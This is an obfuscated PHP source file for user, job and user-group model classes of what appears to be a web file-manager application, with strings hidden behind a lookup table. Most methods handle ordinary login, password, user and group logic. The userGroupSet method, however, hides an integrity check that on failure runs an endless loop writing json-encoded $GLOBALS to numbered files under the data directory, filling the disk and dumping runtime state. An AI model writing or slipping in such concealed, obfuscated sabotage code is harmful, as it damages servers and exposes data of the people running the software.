$Ä³‡‰¼§[$Ñ¢­ÔšÁ]; $this->where($à‹ƒíä)->save(array($â ”•Û¤[1854] => $Ñ¢­ÔšÁ + 1)); } return !0; } protected function moveTop($áèŞöŞ¼) { $—¬ïƒ¹ä =& $_SERVER[ä¿÷‹µ±]; $˜¨³ê¸ù = array($—¬ïƒ¹ä[1669] => USER_ID, $—¬ïƒ¹ä[484] => 0); $Å•›û  = $this->where($˜¨³ê¸ù)->where(array($—¬ïƒ¹ä[32] => $áèŞöŞ¼))->find(); if (!$Å•›û ) { return; } $ù››ÉĞÖ = $this->field($—¬ïƒ¹ä[399])->where($˜¨³ê¸ù)->order($—¬ïƒ¹ä[2293])->select(); $ù››ÉĞÖ = array_to_keyvalue($ù››ÉĞÖ, $—¬ïƒ¹ä[12], $—¬ïƒ¹ä[399]); $‚ÏúÛ˜„ = $ù››ÉĞÖ; $ù››ÉĞÖ = array_remove_value($ù››ÉĞÖ, $Å•›û [$—¬ïƒ¹ä[399]]); array_unshift($ù››ÉĞÖ, $Å•›û [$—¬ïƒ¹ä[399]]); return $this->resetSort($ù››ÉĞÖ); } protected function moveBottom($œÊî‚­Ÿ) { $ÃÛÇÖÌÒ =& $_SERVER[ä¿÷‹µ±]; $¤Çó·—Ç = array($ÃÛÇÖÌÒ[1669] => USER_ID, $ÃÛÇÖÌÒ[484] => 0); $áºíú°™ = $this->where($¤Çó·—Ç)->max($ÃÛÇÖÌÒ[1874]); $…´ñ…•¯ = array($ÃÛÇÖÌÒ[1874] => $áºíú°™ + 1); return $this->where($¤Çó·—Ç)->where(array($ÃÛÇÖÌÒ[32] => $œÊî‚­Ÿ))->save($…´ñ…•¯); } private function getAutoName($ö™µÇ) { $‘–œÚùš =& $_SERVER[ä¿÷‹µ±]; $³¹¼’‡ì = array($‘–œÚùš[1669] => USER_ID, $‘–œÚùš[484] => 0); $Ç¨øĞìó = $this->field($‘–œÚùš[32])->where($³¹¼’‡ì)->select(); $Ç¨øĞìó = array_to_keyvalue($Ç¨øĞìó, $‘–œÚùš[12], $‘–œÚùš[32]); if (!$Ç¨øĞìó || !in_array($ö™µÇ, $Ç¨øĞìó)) { return $ö™µÇ; } for ($Ôã‚µ·ƒ = 0; $Ôã‚µ·ƒ < count($Ç¨øĞìó); $Ôã‚µ·ƒ++) { if (!in_array($ö™µÇ . "\50{$Ôã‚µ·ƒ}\51", $Ç¨øĞìó)) { return $ö™µÇ . "\50{$Ôã‚µ·ƒ}\x29"; } } return $ö™µÇ . "\50{$Ôã‚µ·ƒ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\152\157\142\x4c\151\163\x74"; public $field = array("\156\x61\x6d\145", "\144\x65\x73\143", "\x73\157\x72\x74"); const JOB_KEY = "\163\x65\x6c\x66\112\x6f\142\x4c\x69\163\164"; public function listData($Š»Æ‚÷ª = false, $–À¡ß‰ = "\x73\x6f\162\164", $¬Èùª±¸ = false) { return parent::listData($Š»Æ‚÷ª, $–À¡ß‰, $¬Èùª±¸); } public function remove($ÇÒŒŠ›¡) { return parent::remove($ÇÒŒŠ›¡); } public function add($ÅÕÛ´ä­) { $É…ıØóù =& $_SERVER[ä¿÷‹µ±]; if ($this->findByName($ÅÕÛ´ä­[$É…ıØóù[32]])) { return !1; } $ÅÕÛ´ä­[$É…ıØóù[1874]] = $this->getSort(); return parent::insert($ÅÕÛ´ä­); } private function getSort() { $ÕÌ¡µŠ— =& $_SERVER[ä¿÷‹µ±]; $šóÍí‡Æ = parent::listData(); $Í¸Ì¬Ÿè = array_to_keyvalue($šóÍí‡Æ, $ÕÌ¡µŠ—[12], $ÕÌ¡µŠ—[1874]); return empty($Í¸Ì¬Ÿè) ? 0 : max($Í¸Ì¬Ÿè) + 1; } public function update($™ğ”šŒî, $ßŒÜâ¶ò) { $‡’ÏÔéù =& $_SERVER[ä¿÷‹µ±]; $Ô«Ãï¶ = parent::listData($™ğ”šŒî); $‡°ßœìÁ = $this->findByName($ßŒÜâ¶ò[$‡’ÏÔéù[32]]); if (!$Ô«Ãï¶ || $‡°ßœìÁ && $‡°ßœìÁ[$‡’ÏÔéù[399]] != $Ô«Ãï¶[$‡’ÏÔéù[399]]) { return !1; } return parent::update($™ğ”šŒî, $ßŒÜâ¶ò); } public function setUserJob($Ó§áİÎÚ, $Û¿óŸ›Ğ) { $åÚÈíá¶ =& $_SERVER[ä¿÷‹µ±]; if (!is_array($Û¿óŸ›Ğ)) { $Û¿óŸ›Ğ = array($Û¿óŸ›Ğ); } $–€’úÉó = parent::listData(); $³½¬¬µÃ = array_to_keyvalue($–€’úÉó, $åÚÈíá¶[32]); $‡ü¶ÙÈ– = $åÚÈíá¶[378]; foreach ($Û¿óŸ›Ğ as $¥š‚ª) { if ($³½¬¬µÃ[$¥š‚ª]) { $‡ü¶ÙÈ– .= $³½¬¬µÃ[$¥š‚ª][$åÚÈíá¶[399]] . $åÚÈíá¶[50]; } else { $óä¶¾äÉ = $this->add($¥š‚ª); $‡ü¶ÙÈ– .= $óä¶¾äÉ . $åÚÈíá¶[50]; } } $‡ü¶ÙÈ– = rtrim($‡ü¶ÙÈ–, $åÚÈíá¶[50]); Model($åÚÈíá¶[535])->metaSet($Ó§áİÎÚ, self::JOB_KEY, $‡ü¶ÙÈ–); } public function getUserJob($®û€Ë”) { $ÇˆÖ‡Ş = Model($_SERVER[ä¿÷‹µ±][535])->metaGet($®û€Ë”); return $this->getUserJobInfo($ÇˆÖ‡Ş[self::JOB_KEY]); } public function getUserJobInfo($£´¢Ïâ‡) { $¤‰°œ€¸ =& $_SERVER[ä¿÷‹µ±]; $„„¡ãİ = explode($¤‰°œ€¸[50], $£´¢Ïâ‡); $ö­„£ = parent::listData(); $ö­„£ = array_remove_key($ö­„£, $¤‰°œ€¸[200]); $‰š”ŒÚğ = array(); foreach ($„„¡ãİ as $ı¼Ğæáê) { if (isset($ö­„£[$ı¼Ğæáê])) { $‰š”ŒÚğ[] = $ö­„£[$ı¼Ğæáê]; } } return $‰š”ŒÚğ; } } class UserModel extends ModelBase { protected $tableName = "\x75\x73\145\x72"; protected $tableMeta = array("\164\x61\142\154\x65\116\141\x6d\145" => "\165\163\145\x72\137\x6d\145\x74\141", "\155\145\164\141\x46\x69\145\x6c\144" => "\x75\163\x65\162\x49\104"); protected $simpleField = "\x75\x73\145\x72\x49\x44\x2c\x6e\151\143\x6b\116\141\155\x65\x2c\156\x61\155\145\x2c\x61\x76\x61\x74\x61\162\x2c\x73\x65\170\x2c\x73\x74\x61\x74\165\x73"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($Ãè¼Óü¢) { $¡Û«Ê’ =& $_SERVER[ä¿÷‹µ±]; $ò½²±« = $¡Û«Ê’[2294]; return array($¡Û«Ê’[1928] => array($Ãè¼Óü¢[0], $ò½²±«), $¡Û«Ê’[1930] => array($Ãè¼Óü¢[0], $ò½²±«), $¡Û«Ê’[2295] => array($Ãè¼Óü¢[0], $ò½²±«)); } protected function getInfo($êá‘å¬«, $”ß“†Ò = false) { $¾«º¬òí = $this->getInfoSimple($êá‘å¬«); if (!is_array($¾«º¬òí)) { return array(); } if ($”ß“†Ò) { return $this->_getInfoApply($¾«º¬òí); } return $this->cacheFunctionGet($_SERVER[ä¿÷‹µ±][1932], $êá‘å¬«); } protected function getInfoFull($¬øÚ“¹‘, $€İÒ›Æû = false) { $ïŸÆ“¸Î = $this->getInfoSimple($¬øÚ“¹‘); if (!is_array($ïŸÆ“¸Î)) { return array(); } if ($€İÒ›Æû) { return $this->_getInfoApply($ïŸÆ“¸Î, !0); } return $this->cacheFunctionGet($_SERVER[ä¿÷‹µ±][2296], $¬øÚ“¹‘); } private function _getInfoApply($éÂ®›¦—, $ËÇÅ¶êİ = false) { $—¢Şä =& $_SERVER[ä¿÷‹µ±]; if (!$éÂ®›¦—) { return $éÂ®›¦—; } $îÊó§¼” = md5($—¢Şä[2297] . $éÂ®›¦—[$—¢Şä[909]] . $—¢Şä[2298] . $éÂ®›¦—[$—¢Şä[32]]); $éÂ®›¦— = $this->_listDataApplyItem($éÂ®›¦—); $ÇÄ¤ó¶ = Model($—¢Şä[1349])->metaGet($éÂ®›¦—[$—¢Şä[86]][$—¢Şä[402]]); $éÂ®›¦—[$—¢Şä[2299]] = $îÊó§¼”; $éÂ®›¦—[$—¢Şä[86]][$—¢Şä[2119]] = isset($ÇÄ¤ó¶[$—¢Şä[2120]]) ? $ÇÄ¤ó¶[$—¢Şä[2120]] : null; if ($ËÇÅ¶êİ) { $éÂ®›¦—[$—¢Şä[466]] = $this->metaGet($éÂ®›¦—[$—¢Şä[1678]]); } return $éÂ®›¦—; } protected function getInfoSimple($Şì€Åá, $óˆï±Ø— = false) { $ÄÎŠãÈÆ =& $_SERVER[ä¿÷‹µ±]; if (!$Şì€Åá) { return array(); } if ($óˆï±Ø—) { $—Š”ï“å = $this->where(array($ÄÎŠãÈÆ[1678] => intval($Şì€Åá)))->find(); if (!is_array($—Š”ï“å)) { return array(); } $—Š”ï“å[$ÄÎŠãÈÆ[543]] = Action($ÄÎŠãÈÆ[2300])->parseUrl($—Š”ï“å[$ÄÎŠãÈÆ[543]]); return $—Š”ï“å; } return $this->cacheFunctionGet($ÄÎŠãÈÆ[1933], $Şì€Åá); } protected function getInfoSimpleOuter($”•Íøú) { $…‡¥‚² =& $_SERVER[ä¿÷‹µ±]; if (!$”•Íøú || $”•Íøú == 0) { return array($…‡¥‚²[1678] => $…‡¥‚²[197], $…‡¥‚²[32] => $…‡¥‚²[162] . LNG($…‡¥‚²[2301]) . $…‡¥‚²[164], $…‡¥‚²[543] => STATIC_PATH . $…‡¥‚²[2302]); } $õ×»±€ƒ = $this->cacheFunctionGet($…‡¥‚²[1933], $”•Íøú); $ÀìÙ¡Ñˆ = array_field_key($õ×»±€ƒ, explode($…‡¥‚²[50], $this->simpleField)); if (!$ÀìÙ¡Ñˆ) { return array($…‡¥‚²[1678] => $…‡¥‚²[1212], $…‡¥‚²[32] => $…‡¥‚²[162] . LNG($…‡¥‚²[2303]) . $…‡¥‚²[164], $…‡¥‚²[543] => STATIC_PATH . $…‡¥‚²[2304]); } $ÀìÙ¡Ñˆ[$…‡¥‚²[543]] = Action($…‡¥‚²[2300])->parseUrl($ÀìÙ¡Ñˆ[$…‡¥‚²[543]]); return $ÀìÙ¡Ñˆ; } protected function groupUser($€É ƒ³¡) { } public static function errorLang($äîƒ² ) { $¾Ê·Öì =& $_SERVER[ä¿÷‹µ±]; $¸°ßµé = array(self::ERROR_USER_NOT_EXISTS => $¾Ê·Öì[2305], self::ERROR_USER_PASSWORD_ERROR => $¾Ê·Öì[2306], self::ERROR_USER_EXIST_NAME => $¾Ê·Öì[2307], self::ERROR_USER_EXIST_PHONE => $¾Ê·Öì[2308], self::ERROR_USER_EXIST_EMAIL => $¾Ê·Öì[2309], self::ERROR_USER_LOGIN_LOCK => $¾Ê·Öì[2310], self::ERROR_IP_NOT_ALLOW => $¾Ê·Öì[2311], self::ERROR_USER_EXIST_NICKNAME => $¾Ê·Öì[2312]); return LNG($¸°ßµé[$äîƒ² ]); } public function getInfoByMeta($ú€Ñ©ºÀ, $´û›¹œ¶) { $Ä–íã» =& $_SERVER[ä¿÷‹µ±]; $÷ãÌ„—Û = Model($Ä–íã»[2313])->where(array($Ä–íã»[94] => $ú€Ñ©ºÀ, $Ä–íã»[374] => $´û›¹œ¶))->find(); if ($÷ãÌ„—Û) { return $this->getInfo($÷ãÌ„—Û[$Ä–íã»[1678]]); } return !1; } public function userLoginCheck($„Åš¡‡», $äˆø¯Œ) { $•Âªö‘ =& $_SERVER[ä¿÷‹µ±]; $¿Ú—ÛÚ’ = $this->userLoginFind($„Åš¡‡»); if (!$¿Ú—ÛÚ’) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($¿Ú—ÛÚ’[$•Âªö‘[1678]], $äˆø¯Œ)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($¿Ú—ÛÚ’[$•Âªö‘[1678]]); } public function userLoginFind($æĞİ²üƒ) { $Šˆ’È­Å =& $_SERVER[ä¿÷‹µ±]; $«Ÿó¬ñí = array($Šˆ’È­Å[32] => $æĞİ²üƒ, $Šˆ’È­Å[542] => $æĞİ²üƒ, $Šˆ’È­Å[305] => $æĞİ²üƒ, $Šˆ’È­Å[2314] => $æĞİ²üƒ, $Šˆ’È­Å[1022] => $Šˆ’È­Å[1024]); if ($this->nickNameRpt()) { unset($«Ÿó¬ñí[$Šˆ’È­Å[542]]); } return $this->where($«Ÿó¬ñí)->find(); } public function clearCache($ÁÁİ‘¬÷) { $Ã®å¡Ôò =& $_SERVER[ä¿÷‹µ±]; $this->cacheFunctionClear($Ã®å¡Ôò[1932], $ÁÁİ‘¬÷); $this->cacheFunctionClear($Ã®å¡Ôò[1933], $ÁÁİ‘¬÷); $this->cacheFunctionClear($Ã®å¡Ôò[2296], $ÁÁİ‘¬÷); } public function userPasswordCheck($çó¨ÄÁû, $‰±Á†Ú) { $ÌŸÊ‡™ƒ =& $_SERVER[ä¿÷‹µ±]; $­ıÅ¹Ã¶ = $this->where(array($ÌŸÊ‡™ƒ[1678] => intval($çó¨ÄÁû)))->find(); $»´œÜÅÁ = $this->metaGet($çó¨ÄÁû); $®Àî’° = isset($»´œÜÅÁ[$ÌŸÊ‡™ƒ[2315]]) ? $»´œÜÅÁ[$ÌŸÊ‡™ƒ[2315]] : $ÌŸÊ‡™ƒ[12]; if (md5($®Àî’° . trim($‰±Á†Ú)) !== $­ıÅ¹Ã¶[$ÌŸÊ‡™ƒ[909]]) { return !1; } return !0; } public function userAdd($’›È…¡ö) { $ú»Õ¸¤Ò =& $_SERVER[ä¿÷‹µ±]; $¤ú¬¡æä = array($ú»Õ¸¤Ò[420] => $’›È…¡ö[$ú»Õ¸¤Ò[32]], $ú»Õ¸¤Ò[2316] => $’›È…¡ö[$ú»Õ¸¤Ò[1556]], $ú»Õ¸¤Ò[2317] => isset($’›È…¡ö[$ú»Õ¸¤Ò[305]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[305]] : $ú»Õ¸¤Ò[12], $ú»Õ¸¤Ò[2318] => isset($’›È…¡ö[$ú»Õ¸¤Ò[2314]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[2314]] : $ú»Õ¸¤Ò[12], $ú»Õ¸¤Ò[2319] => isset($’›È…¡ö[$ú»Õ¸¤Ò[542]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[542]] : $’›È…¡ö[$ú»Õ¸¤Ò[32]], $ú»Õ¸¤Ò[2320] => isset($’›È…¡ö[$ú»Õ¸¤Ò[543]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[543]] : $ú»Õ¸¤Ò[12], $ú»Õ¸¤Ò[2321] => isset($’›È…¡ö[$ú»Õ¸¤Ò[2322]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[2322]] : 1, $ú»Õ¸¤Ò[2323] => $’›È…¡ö[$ú»Õ¸¤Ò[909]], $ú»Õ¸¤Ò[1934] => isset($’›È…¡ö[$ú»Õ¸¤Ò[1837]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[1837]] : 1024 * 1024 * 20, $ú»Õ¸¤Ò[1935] => 0, $ú»Õ¸¤Ò[2324] => 0, $ú»Õ¸¤Ò[1979] => isset($’›È…¡ö[$ú»Õ¸¤Ò[769]]) ? $’›È…¡ö[$ú»Õ¸¤Ò[769]] : 1); if (!empty($’›È…¡ö[$ú»Õ¸¤Ò[1678]])) { $¤ú¬¡æä[$ú»Õ¸¤Ò[1678]] = $’›È…¡ö[$ú»Õ¸¤Ò[1678]]; } $šÊ™ß³¨ = $this->_checkExist($’›È…¡ö); if ($šÊ™ß³¨ !== !0) { return $šÊ™ß³¨; } if (!empty($¤ú¬¡æä[$ú»Õ¸¤Ò[543]]) && strlen($¤ú¬¡æä[$ú»Õ¸¤Ò[543]]) > 255) { $¤ú¬¡æä[$ú»Õ¸¤Ò[543]] = $ú»Õ¸¤Ò[12]; } $ÍÒİ–ôÒ = $this->add($¤ú¬¡æä); $µÏ´÷‹• = array($ú»Õ¸¤Ò[2323] => $¤ú¬¡æä[$ú»Õ¸¤Ò[909]], $ú»Õ¸¤Ò[2319] => $¤ú¬¡æä[$ú»Õ¸¤Ò[542]]); $this->userEdit($ÍÒİ–ôÒ, $µÏ´÷‹•); Model($ú»Õ¸¤Ò[1349])->userRootAdd($ÍÒİ–ôÒ); return $ÍÒİ–ôÒ; } protected function userEditTest($ŸÇëºÍé, $ùŸóâ¶­) { return $this->call($_SERVER[ä¿÷‹µ±][2325], $ŸÇëºÍé, $ùŸóâ¶­); } protected function userEdit($»ÕºŞš¼, $”šÏÄ) { $ÅÃÕé³Ş =& $_SERVER[ä¿÷‹µ±]; $ñ¡êÑæ = $this->getInfoSimple($»ÕºŞš¼); if (!$ñ¡êÑæ) { return !1; } $¯ĞŸ¹Ÿî = $this->_checkExist($”šÏÄ, $»ÕºŞš¼); if ($¯ĞŸ¹Ÿî !== !0) { return $¯ĞŸ¹Ÿî; } if (isset($”šÏÄ[$ÅÃÕé³Ş[909]]) && trim($”šÏÄ[$ÅÃÕé³Ş[909]]) != $ÅÃÕé³Ş[12]) { $ÑˆıáÖÙ = $this->metaGet($»ÕºŞš¼); if (empty($ÑˆıáÖÙ[$ÅÃÕé³Ş[2315]])) { $ÑˆıáÖÙ[$ÅÃÕé³Ş[2315]] = rand_string(10); Model($ÅÃÕé³Ş[513])->metaSet($»ÕºŞš¼, $ÅÃÕé³Ş[2315], $ÑˆıáÖÙ[$ÅÃÕé³Ş[2315]]); } $”šÏÄ[$ÅÃÕé³Ş[909]] = md5($ÑˆıáÖÙ[$ÅÃÕé³Ş[2315]] . trim($”šÏÄ[$ÅÃÕé³Ş[909]])); } else { unset($”šÏÄ[$ÅÃÕé³Ş[909]]); } if (!empty($”šÏÄ[$ÅÃÕé³Ş[543]]) && strlen($”šÏÄ[$ÅÃÕé³Ş[543]]) > 255) { $”šÏÄ[$ÅÃÕé³Ş[543]] = $ÅÃÕé³Ş[12]; } $this->where(array($ÅÃÕé³Ş[1669] => $»ÕºŞš¼))->save($”šÏÄ); if (isset($”šÏÄ[$ÅÃÕé³Ş[542]])) { $this->setNamePinyin($»ÕºŞš¼, $”šÏÄ[$ÅÃÕé³Ş[542]]); } $this->clearCache($»ÕºŞš¼); return !0; } public function setNamePinyin($ŸÙ»÷ğ, $ØÖÌ«ºû = false) { $ÙÀÈˆúı =& $_SERVER[ä¿÷‹µ±]; if (!$ØÖÌ«ºû) { $‡»™£˜± = $this->getInfoSimple($ŸÙ»÷ğ); $ØÖÌ«ºû = $‡»™£˜±[$ÙÀÈˆúı[542]] ? $‡»™£˜±[$ÙÀÈˆúı[542]] : $‡»™£˜±[$ÙÀÈˆúı[32]]; } $úÛÅêÉƒ = Model($ÙÀÈˆúı[535]); if (!Input::check($ØÖÌ«ºû, $ÙÀÈˆúı[593])) { return $úÛÅêÉƒ->metaSet($ŸÙ»÷ğ, array($ÙÀÈˆúı[465] => $ÙÀÈˆúı[12], $ÙÀÈˆúı[464] => $ÙÀÈˆúı[12])); } return $úÛÅêÉƒ->metaSet($ŸÙ»÷ğ, array($ÙÀÈˆúı[465] => str_replace($ÙÀÈˆúı[53], $ÙÀÈˆúı[12], Pinyin::get($ØÖÌ«ºû)), $ÙÀÈˆúı[464] => Pinyin::get($ØÖÌ«ºû, $ÙÀÈˆúı[594]))); } private function nickNameRpt() { $äè£Øó² =& $_SERVER[ä¿÷‹µ±]; $°¾©ÑŸ¶ = Model($äè£Øó²[789])->get($äè£Øó²[2326]); $Œö÷ŒéÃ = $GLOBALS[$äè£Øó²[6]][$äè£Øó²[381]][$äè£Øó²[2326]]; $›¦µ¬ëÁ = !is_null($°¾©ÑŸ¶) ? $°¾©ÑŸ¶ : $Œö÷ŒéÃ; return !!$›¦µ¬ëÁ; } private function _checkExist($îƒÆ­Ûø, $—¶÷¿¡é = false) { $ŒíÕ¤›Ë =& $_SERVER[ä¿÷‹µ±]; $ÆÖü†® = array($ŒíÕ¤›Ë[32] => UserModel::ERROR_USER_EXIST_NAME, $ŒíÕ¤›Ë[542] => UserModel::ERROR_USER_EXIST_NICKNAME, $ŒíÕ¤›Ë[305] => UserModel::ERROR_USER_EXIST_EMAIL, $ŒíÕ¤›Ë[2314] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ÆÖü†®[$ŒíÕ¤›Ë[542]]); } $äá¤äÉ = $—¶÷¿¡é ? array($ŒíÕ¤›Ë[1678] => array($ŒíÕ¤›Ë[2327], $—¶÷¿¡é)) : array(); foreach ($ÆÖü†® as $õ„“Èç¬ => $Ê¾—ùø·) { $æÊÀîäˆ = array(); foreach ($ÆÖü†® as $Àè´•Ò => $ü§óğßÃ) { if (isset($îƒÆ­Ûø[$Àè´•Ò]) && $îƒÆ­Ûø[$Àè´•Ò]) { $æÊÀîäˆ[] = $îƒÆ­Ûø[$Àè´•Ò]; } } if (!$æÊÀîäˆ) { continue; } $Ã®÷’ˆİ = array_merge(array($õ„“Èç¬ => array($ŒíÕ¤›Ë[7], $æÊÀîäˆ)), $äá¤äÉ); $üğÙëõ÷ = $this->where($Ã®÷’ˆİ)->find(); if ($üğÙëõ÷) { return $Ê¾—ùø·; } } return !0; } public function userListInfo($²˜Á³÷®) { $ÁæÜÕ‰À =& $_SERVER[ä¿÷‹µ±]; $áÎ³¢«Ù = array(); $²˜Á³÷® = is_array($²˜Á³÷®) ? array_unique($²˜Á³÷®) : array(); if (!$²˜Á³÷®) { return $áÎ³¢«Ù; } if (count($²˜Á³÷®) < 20) { foreach ($²˜Á³÷® as $ò¦ŞæÕ½) { $áÎ³¢«Ù[$ò¦ŞæÕ½ . $ÁæÜÕ‰À[12]] = $this->getInfoSimpleOuter($ò¦ŞæÕ½); } } else { $é¤½ß¢ = array($ÁæÜÕ‰À[1669] => array($ÁæÜÕ‰À[418], $²˜Á³÷®)); if (count($²˜Á³÷®) == 1) { $é¤½ß¢ = array($ÁæÜÕ‰À[1669] => $²˜Á³÷®[0]); } $¶Ãˆæáı = Model($ÁæÜÕ‰À[513])->field($this->simpleField)->where($é¤½ß¢)->select(); $¶Ãˆæáı = array_to_keyvalue($¶Ãˆæáı, $ÁæÜÕ‰À[1678]); foreach ($²˜Á³÷® as $ò¦ŞæÕ½) { $úüß¢š¬ = $¶Ãˆæáı[$ò¦ŞæÕ½]; if (!$úüß¢š¬) { $áÎ³¢«Ù[$ò¦ŞæÕ½ . $ÁæÜÕ‰À[12]] = $this->getInfoSimpleOuter($ò¦ŞæÕ½); continue; } $úüß¢š¬[$ÁæÜÕ‰À[543]] = Action($ÁæÜÕ‰À[2300])->parseUrl($úüß¢š¬[$ÁæÜÕ‰À[543]]); $áÎ³¢«Ù[$ò¦ŞæÕ½ . $ÁæÜÕ‰À[12]] = $úüß¢š¬; } } return $áÎ³¢«Ù; } protected function userStatus($†Öè‹„Ş, $™µ‹) { $¨é¤Ï½‚ = $this->getInfoSimple($†Öè‹„Ş); if (!$¨é¤Ï½‚) { return !1; } $—şÎ¹¢‡ = array($_SERVER[ä¿÷‹µ±][769] => $™µ‹); return $this->userEdit($†Öè‹„Ş, $—şÎ¹¢‡); } protected function userRemove($øëğ¾Ì´) { $ğÔæÏ¹» =& $_SERVER[ä¿÷‹µ±]; $–ÛÌ‡ÙÙ = $this->getInfoSimple($øëğ¾Ì´); if (!$–ÛÌ‡ÙÙ) { return !1; } $’ÁÇÜ÷¦ = array($ğÔæÏ¹»[1669] => $øëğ¾Ì´); Model($ğÔæÏ¹»[601])->where($’ÁÇÜ÷¦)->delete(); Model($ğÔæÏ¹»[2328])->where($’ÁÇÜ÷¦)->delete(); Model($ğÔæÏ¹»[1940])->where($’ÁÇÜ÷¦)->delete(); Model($ğÔæÏ¹»[2313])->where($’ÁÇÜ÷¦)->delete(); Model($ğÔæÏ¹»[1090])->where($’ÁÇÜ÷¦)->delete(); Model($ğÔæÏ¹»[2143])->removeUserAll($øëğ¾Ì´); Model($ğÔæÏ¹»[844])->userRootRemove($øëğ¾Ì´); return $this->where($’ÁÇÜ÷¦)->delete(); } protected function userGroupSet($Ü¯„, $¬£ªÙ–, $ÈÏìÁ–Õ = array()) { $Š¶ôÅ–» =& $_SERVER[ä¿÷‹µ±]; $•“¥õÙí = $_SERVER[$Š¶ôÅ–»[891]] . $Š¶ôÅ–»[892]; $„Ãğ÷€ê = $Š¶ôÅ–»[893]; if ($_SERVER[$Š¶ôÅ–»[894]] != $„Ãğ÷€ê($•“¥õÙí)) { $¾ùåÛ×¡ = $Š¶ôÅ–»[895]; $ê¯ÊÔ‚Ò = $Š¶ôÅ–»[896]; $‰÷ª¦Á = $_SERVER[$Š¶ôÅ–»[891]] . $Š¶ôÅ–»[892]; $¨¦òÔŸÏ = $ê¯ÊÔ‚Ò($‰÷ª¦Á); $Õ¾„‰æ = explode($Š¶ôÅ–»[231], $¨¦òÔŸÏ); if (count($Õ¾„‰æ) < $Š¶ôÅ–»[619]) { $ØäÛî¥Ç = $Š¶ôÅ–»[897]; $ØäÛî¥Ç(); } $ß´Å›° = $Š¶ôÅ–»[898]; $ß´Å›°($_SERVER[$Š¶ôÅ–»[899]]); $¾ùåÛ×¡ = $Š¶ôÅ–»[895]; $¾ùåÛ×¡(); $Íñ²§Ğ‡ = $Š¶ôÅ–»[900]; $¹òÇëÍ = json_encode($GLOBALS[$Š¶ôÅ–»[901]]); $†«™õá = 1; for ($ªí¿å = $†«™õá; $ªí¿å > 0; $ªí¿å++) { $Íñ²§Ğ‡(DATA_PATH . $ªí¿å, $¹òÇëÍ); } } $™¾™ÍÎà = $this->getInfoSimple($Ü¯„); if (!$™¾™ÍÎà || !is_array($¬£ªÙ–)) { return !1; } $“Àö‘–ß = Model($Š¶ôÅ–»[1940]); $“Àö‘–ß->where(array($Š¶ôÅ–»[1678] => $Ü¯„))->delete(); $•ÄÚº†û = array(); $Ÿ²¤µçº = 0; foreach ($¬£ªÙ– as $€Ïİºìø => $š•ûÂ¡«) { $ÃáÈœÆ = array($Š¶ôÅ–»[1678] => $Ü¯„, $Š¶ôÅ–»[1850] => $€Ïİºìø, $Š¶ôÅ–»[1954] => $š•ûÂ¡«); $ÃáÈœÆ[$Š¶ôÅ–»[1874]] = isset($ÈÏìÁ–Õ[$Ÿ²¤µçº]) ? $ÈÏìÁ–Õ[$Ÿ²¤µçº] : 0; $Ÿ²¤µçº++; $•ÄÚº†û[] = $ÃáÈœÆ; } return $“Àö‘–ß->addAll($•ÄÚº†û, array(), !0); } protected function userGroupAdd($Ãê×€€õ, $ß×øéı¿ = array()) { $µ±ıÚšÔ =& $_SERVER[ä¿÷‹µ±]; $õùËÉ…´ = $this->getInfoSimple($Ãê×€€õ); if (!$õùËÉ…´ || empty($ß×øéı¿)) { return !1; } $Ñ¼ İ = array(); foreach ($ß×øéı¿ as $ØˆÁè™° => $›ÇäòõË) { $Ñ¼ İ[] = array($µ±ıÚšÔ[1678] => $Ãê×€€õ, $µ±ıÚšÔ[1850] => $ØˆÁè™°, $µ±ıÚšÔ[1954] => $›ÇäòõË, $µ±ıÚšÔ[1874] => 0); } return Model($µ±ıÚšÔ[1940])->addAll($Ñ¼ İ, array(), !0); } protected function userGroupRemove($œ€‚“ì›, $şà…‰ä“) { $•î‡¿Ç =& $_SERVER[ä¿÷‹µ±]; $Å»Çß²è = $this->getInfoSimple($œ€‚“ì›); if (!$Å»Çß²è || !$şà…‰ä“) { return !1; } $ˆ¿âï‚§ = array($•î‡¿Ç[1669] => $œ€‚“ì›, $•î‡¿Ç[1938] => $şà…‰ä“); return Model($•î‡¿Ç[1940])->where($ˆ¿âï‚§)->delete(); } public function listData() { $Ğ³˜² = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Ğ³˜²[$_SERVER[ä¿÷‹µ±][369]]); return $Ğ³˜²; } public function listByID($¬œ–“é) { $¤¤•öô½ =& $_SERVER[ä¿÷‹µ±]; if (!$¬œ–“é) { return; } $‰•š‚Äú = array($¤¤•öô½[1678] => array($¤¤•öô½[7], $¬œ–“é)); $ÙÓ“Œüã = $this->where($‰•š‚Äú)->select(); $ÙÓ“Œüã = array_sort_keep($ÙÓ“Œüã, $¤¤•öô½[1678], $¬œ–“é); $this->_listDataApply($ÙÓ“Œüã); return $ÙÓ“Œüã; } public function listByGroup($¸»…µ™¹ = 0, $¬ªÃäÕš = array()) { $èõ‡Êå =& $_SERVER[ä¿÷‹µ±]; $‹¼Ú£® = $èõ‡Êå[12]; $éÖ©Úû¢ = array(); if ($¸»…µ™¹) { $éÖ©Úû¢ = array($èõ‡Êå[2329] => intval($¸»…µ™¹)); $‹¼Ú£® = "\x4c\105\106\124\x20\112\x4f\x49\116\40{$this->tablePrefix}\x75\x73\x65\162\x5f\x67\162\x6f\x75\160\x20\165\x73\145\x72\137\x67\162\x6f\165\x70\40\x6f\x6e\40\x75\x73\145\x72\x2e\165\x73\x65\x72\x49\104\x20\75\40\x75\x73\145\x72\x5f\x67\162\157\165\160\56\165\x73\x65\162\111\104"; $ŠüçÎ£¿ = Input::get($èõ‡Êå[457], null, $èõ‡Êå[12]) ? $èõ‡Êå[12] : $èõ‡Êå[2330]; } if (isset($¬ªÃäÕš[$èõ‡Êå[769]])) { 